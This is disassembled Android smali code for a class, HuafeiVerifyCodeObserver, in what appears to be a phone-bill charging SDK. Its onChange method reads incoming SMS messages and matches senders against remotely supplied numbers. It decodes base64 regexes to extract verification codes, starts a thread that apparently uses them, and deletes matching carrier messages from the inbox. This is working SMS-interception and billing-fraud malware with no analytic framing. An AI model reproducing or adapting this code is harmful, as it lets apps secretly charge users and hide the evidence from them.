.class public Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;
.super Landroid/database/ContentObserver;


# instance fields
.field private a:Landroid/content/Context;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0, p1}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->e:Ljava/lang/String;

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->f:Ljava/lang/String;

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    iput-object p2, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a:Landroid/content/Context;

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    invoke-static {p2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/regex/Matcher;->find()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method static synthetic a(Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->b:Ljava/lang/String;

    return-object v0
.end method

.method private a()V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/hj201606/lib/sms/c;

    invoke-direct {v1, p0}, Lorg/hj201606/lib/sms/c;-><init>(Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic b(Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic c(Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->f:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic d(Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->e:Ljava/lang/String;

    return-object v0
.end method


# virtual methods
.method public onChange(Z)V
    .locals 12

    const-wide/16 v8, -0x1

    const/4 v2, 0x0

    const/4 v6, 0x0

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "HuafeiVerifyCodeObserver_________________start"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    iput-object v2, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->b:Ljava/lang/String;

    iput-object v2, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->c:Ljava/lang/String;

    :try_start_0
    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "body"

    aput-object v4, v2, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "_id desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_6

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_6

    const/4 v2, 0x0

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    const/4 v4, 0x1

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->b:Ljava/lang/String;

    const/4 v4, 0x2

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->c:Ljava/lang/String;

    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    sget-object v1, Lorg/hj201606/lib/HejuInstance;->sentParamsStr:Ljava/lang/String;

    const-string v4, "\\|\\|"

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x0

    aget-object v1, v1, v4

    const-string v4, "divis"

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x0

    aget-object v4, v1, v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->e:Ljava/lang/String;

    const/4 v4, 0x1

    aget-object v4, v1, v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->f:Ljava/lang/String;

    const/4 v4, 0x7

    aget-object v1, v1, v4

    iput-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    const/4 v1, 0x0

    iput-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->e:Ljava/lang/String;

    const-string v4, ""

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->f:Ljava/lang/String;

    const-string v4, ""

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->f:Ljava/lang/String;

    const-string v4, "\\&\\&"

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x1

    aget-object v4, v1, v4

    const/4 v5, 0x0

    aget-object v1, v1, v5

    const-string v5, ","

    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const-string v7, ","

    invoke-virtual {v1, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "VerifyCodeObserver verifycodeNum_________________"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    move v1, v6

    :goto_1
    array-length v4, v5

    if-lt v1, v4, :cond_2

    :cond_0
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "VerifyCodeObserver passNumber_________________"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    const-string v4, ""

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    const-string v4, "0"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->g:Ljava/lang/String;

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    move v1, v6

    :goto_2
    array-length v5, v4

    if-lt v1, v5, :cond_4

    :cond_1
    :goto_3
    return-void

    :cond_2
    aget-object v4, v5, v1

    const-string v10, ""

    if-eq v4, v10, :cond_3

    aget-object v4, v5, v1

    if-eqz v4, :cond_3

    new-instance v4, Lorg/hj201606/lib/utils/HuafeiUtil;

    iget-object v10, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a:Landroid/content/Context;

    invoke-direct {v4, v10}, Lorg/hj201606/lib/utils/HuafeiUtil;-><init>(Landroid/content/Context;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v10, "verifycodeEnd_"

    invoke-direct {v4, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v10, v5, v1

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lorg/hj201606/lib/utils/HuafeiUtil;->getInt(Ljava/lang/String;)I

    move-result v4

    if-gtz v4, :cond_3

    cmp-long v4, v2, v8

    if-eqz v4, :cond_3

    iget-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->b:Ljava/lang/String;

    aget-object v10, v5, v1

    invoke-virtual {v4, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_3

    new-instance v4, Ljava/lang/String;

    aget-object v10, v7, v1

    invoke-virtual {v10}, Ljava/lang/String;->getBytes()[B

    move-result-object v10

    const/4 v11, 0x0

    invoke-static {v10, v11}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v10

    invoke-direct {v4, v10}, Ljava/lang/String;-><init>([B)V

    aput-object v4, v7, v1

    iget-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->c:Ljava/lang/String;

    aget-object v10, v7, v1

    invoke-direct {p0, v4, v10}, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    iget-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    const-string v10, ""

    if-eq v4, v10, :cond_3

    iget-object v4, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->d:Ljava/lang/String;

    if-eqz v4, :cond_3

    invoke-direct {p0}, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a()V

    new-instance v4, Lorg/hj201606/lib/utils/HuafeiUtil;

    iget-object v10, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->a:Landroid/content/Context;

    invoke-direct {v4, v10}, Lorg/hj201606/lib/utils/HuafeiUtil;-><init>(Landroid/content/Context;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v10, "verifycodeEnd_"

    invoke-direct {v4, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v10, v5, v1

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v10, 0x1

    invoke-static {v4, v10}, Lorg/hj201606/lib/utils/HuafeiUtil;->saveInt(Ljava/lang/String;I)V

    :cond_3
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_1

    :cond_4
    cmp-long v5, v2, v8

    if-eqz v5, :cond_5

    iget-object v5, p0, Lorg/hj201606/lib/sms/HuafeiVerifyCodeObserver;->b:Ljava/lang/String;

    aget-object v6, v4, v1

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_5

    sget-object v5, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "VerifyCodeObserver delete_________________"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v7, v4, v1

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v5, "content://sms"

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "_id="

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v0, v5, v6, v7}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_5
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_2

    :cond_6
    move-wide v2, v8

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_3
.end method
